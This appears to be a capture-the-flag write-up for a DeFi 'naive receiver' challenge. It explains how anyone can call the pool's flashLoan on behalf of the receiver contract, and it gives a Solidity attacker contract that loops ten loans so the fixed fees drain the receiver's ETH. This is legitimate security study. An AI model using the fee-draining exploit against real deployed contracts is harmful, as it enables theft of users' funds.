So, lets see what the challenge is asking us for.

We have to drain the FlashLoanReceiver balance.

The first thing that we have to take a look is how the **flashLoan** function actually works and what issues we find:

```js
    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }
```

The key here is that anyone can call this function (because is marked as external) and ask for a flashLoan for any **borrower** address that we want. But we have a few restrictions about the **borrower**:

- The borrower should be a contract
- The borrower must be able to pay back the loan with the fee
- The borrower must have a receiver function or a fallback payable function
- The borrower must have an external function with the form **receiveEther(uint256)** 

Hopefully, our target fullfills all of this requirements.

Let's take a look to the target contract function **receiveEther** then:

```js
  function receiveEther(uint256 fee) public payable {
      require(msg.sender == pool, "Sender must be pool");

      uint256 amountToBeRepaid = msg.value + fee;

      require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
      
      _executeActionDuringFlashLoan();
      
      // Return funds to pool
      pool.sendValue(amountToBeRepaid);
  }
```

We have a few validations here.

- The sender has to be the pool
- The contract balance must have the required ether amount to pay back the loan

So, we know that the contract balance is 10 ETH. We know that the FIX_FEE for each flash loan call is 1 ETH and what we want to accomplish is drain all the ETH from the receiver balance.

And we want to do it all in a single transaction (extra points are always welcome :)

Let's create an attacker contract and test a few things.

First we are going to create a dummy contract with references to both target contracts, the pool and the receiver:

```js
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  import "hardhat/console.sol";

  contract NaiveReceiverAttacker {

    address immutable target;
    address immutable pool;

    constructor(address _target, address _pool) {
      target = _target;
      pool = _pool;
    }
  }
```

Now we are going to work on a function attack that we want to call:

We want to call the flashLoan function until the balance of the target is 0.

We know that the contract has 10 ETH, and then each call will consume 1 ETH as fees.

So, what we want is call the flash loan 10 times. Let's create that function:

```js
  function attack() external {
    bool success;
    uint256 targetBalance = address(target).balance;
    for(uint8 i = 0; i < 10; i++) {
      console.log("old targetBalance", targetBalance);
      (success, ) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", target, 0));
      require(success, "call failed");
      targetBalance = address(target).balance;
      console.log("new targetBalance", targetBalance);
    }
  }
```


